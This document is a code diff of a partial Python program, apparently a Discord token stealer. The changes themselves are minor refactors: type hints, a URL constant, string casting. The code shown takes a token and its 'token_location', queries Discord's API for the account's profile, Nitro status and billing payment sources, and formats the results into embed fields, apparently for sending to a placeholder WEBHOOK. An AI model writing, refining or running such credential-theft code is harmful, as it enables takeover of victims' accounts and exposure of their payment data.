@@ -14,7 +14,7 @@ WEBHOOK = "{WEBHOOK}"
 
 def open_url(url: str,
              token: Optional[str] = None,
-             data: Optional[bytes] = None):
+             data: Optional[bytes] = None) -> Optional[dict]:
     headers = {
         "Content-Type": "application/json",
         "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64) "
@@ -28,7 +28,6 @@ def open_url(url: str,
         if result:
             return loads(result)
     except Exception:
-        # print(f"Error: {error}")
         pass
 
 
@@ -96,6 +95,7 @@ class Computer():
 class Account():
 
     DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
+    DISCORD_AVATARS_URL = "https://cdn.discordapp.com/avatars/"
 
     def __init__(self, token: str, token_location: str):
         self.token: str = token
@@ -112,9 +112,8 @@ class Account():
         self.locale: str = self.account_data.get('locale')
         self.nitro: bool = bool(self.account_data.get('premium_type'))
         self.avatar_id: str = self.account_data.get('avatar')
-        self.avatar_url: str = (f"https://cdn.discordapp.com/avatars/"
-                                f"{self.id}/"
-                                f"{self.avatar_id}")
+        self.avatar_url: str = (self.DISCORD_AVATARS_URL
+                                + f"/{self.id}/{self.avatar_id}")
         self.billing_data: str = open_url(self.DISCORD_API_URL
                                           + "/billing/payment-sources",
                                           self.token)
@@ -141,7 +140,7 @@ class Account():
 def field_former(title: str, text: str, inline: bool = True) -> str:
     return {
         "name": f"**{title} Info**",
-        "value": text,
+        "value": str(text),
         "inline": bool(inline)
         }
 
